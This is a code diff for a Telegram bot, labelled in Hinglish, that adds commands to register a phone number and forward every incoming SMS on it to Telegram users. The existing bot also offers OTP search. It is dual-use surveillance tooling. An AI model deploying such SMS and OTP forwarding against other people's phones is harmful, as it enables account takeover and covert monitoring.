@@ -7,7 +7,16 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 
 from app.config import get_settings
 from app.database import Device, SMSMessage, SessionLocal
-from app.services import claim_device, device_status, list_devices_with_counts, register_device
+from app.services import (
+    claim_device,
+    device_status,
+    get_monitoring_user_ids,
+    list_devices_with_counts,
+    register_device,
+    set_user_phone,
+    start_monitoring,
+    stop_monitoring,
+)
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
@@ -47,9 +56,16 @@ async def notify_new_sms(sms: SMSMessage) -> None:
     if not settings.telegram_bot_token:
         return
 
-    allowed_users = settings.allowed_user_ids
-    if not allowed_users:
-        logger.warning("No TELEGRAM_ALLOWED_USERS set; skipping notification")
+    db: Session = SessionLocal()
+    try:
+        monitoring_users = get_monitoring_user_ids(db, sms)
+        if not monitoring_users and settings.allowed_user_ids:
+            monitoring_users = settings.allowed_user_ids
+    finally:
+        db.close()
+
+    if not monitoring_users:
+        logger.warning("No active monitors; skipping notification")
         return
 
     from telegram import Bot
@@ -57,7 +73,7 @@ async def notify_new_sms(sms: SMSMessage) -> None:
     bot = Bot(token=settings.telegram_bot_token)
     text = "🆕 *New SMS Received*\n\n" + format_sms(sms)
 
-    for user_id in allowed_users:
+    for user_id in monitoring_users:
         try:
             await bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown")
         except Exception as exc:
@@ -72,6 +88,9 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     await update.message.reply_text(
         "👋 *SMS Monitor Bot*\n\n"
         "Commands:\n"
+        "/mynum <number> - Apna number set karo\n"
+        "/startmonitar - SMS forwarding start\n"
+        "/stopmonitar - SMS forwarding stop\n"
         "/a <deviceid> - Apni device add/claim karo\n"
         "/devices - Apni saari devices dekho\n"
         "/device <name> - Ek device ke SMS dekho\n"
@@ -92,6 +111,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "📖 *Help*\n\n"
         "Apna database `.env` mein `DATABASE_URL` se connect karo.\n"
         "Device SMS bhejti hai to automatically bot mein aa jati hai.\n\n"
+        "*Monitor commands:*\n"
+        "/mynum 9876543210 - Apna SIM number set karo\n"
+        "/startmonitar - Is number ke saare SMS forward\n"
+        "/stopmonitar - Forwarding band karo\n\n"
         "*Device commands:*\n"
         "/a myphone - Apni device add/claim karo\n"
         "/devices - Meri devices list\n"
@@ -101,6 +124,87 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/recent - Last 10 SMS\n"
         "/search otp - OTP dhundho\n"
         "/stats - Statistics",
+        parse_mode="Markdown",
+    )
+
+
+async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: `/mynum <number>`\n\n"
+            "Example:\n"
+            "`/mynum 9876543210`\n"
+            "`/mynum +919876543210`",
+            parse_mode="Markdown",
+        )
+        return
+
+    phone = context.args[0]
+    db: Session = SessionLocal()
+    try:
+        profile, device = set_user_phone(db, user.id, phone)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    except PermissionError:
+        await update.message.reply_text("❌ Ye number kisi aur user ka hai.")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        f"✅ Number set: `+{profile.phone_number}`\n"
+        f"📱 Device: `{device.name}`\n"
+        f"🔑 API key: `{device.api_key}`\n\n"
+        f"Ab `/startmonitar` likho forwarding start karne ke liye.",
+        parse_mode="Markdown",
+    )
+
+
+async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = start_monitoring(db, user.id)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        f"🟢 *Monitoring Started!*\n\n"
+        f"📞 Number: `+{profile.phone_number}`\n"
+        f"📨 Ab is number par aane wale *saare incoming SMS* "
+        f"yahan forward honge.\n\n"
+        f"Phone par webhook setup karo ya superuser daemon chalao.",
+        parse_mode="Markdown",
+    )
+
+
+async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    db: Session = SessionLocal()
+    try:
+        profile = stop_monitoring(db, user.id)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        f"🔴 Monitoring stopped for `+{profile.phone_number or 'unknown'}`",
         parse_mode="Markdown",
     )
 
@@ -340,6 +444,9 @@ def build_telegram_app() -> Application | None:
     app = Application.builder().token(settings.telegram_bot_token).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("mynum", mynum_command))
+    app.add_handler(CommandHandler("startmonitar", startmonitar_command))
+    app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
     app.add_handler(CommandHandler("a", a_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
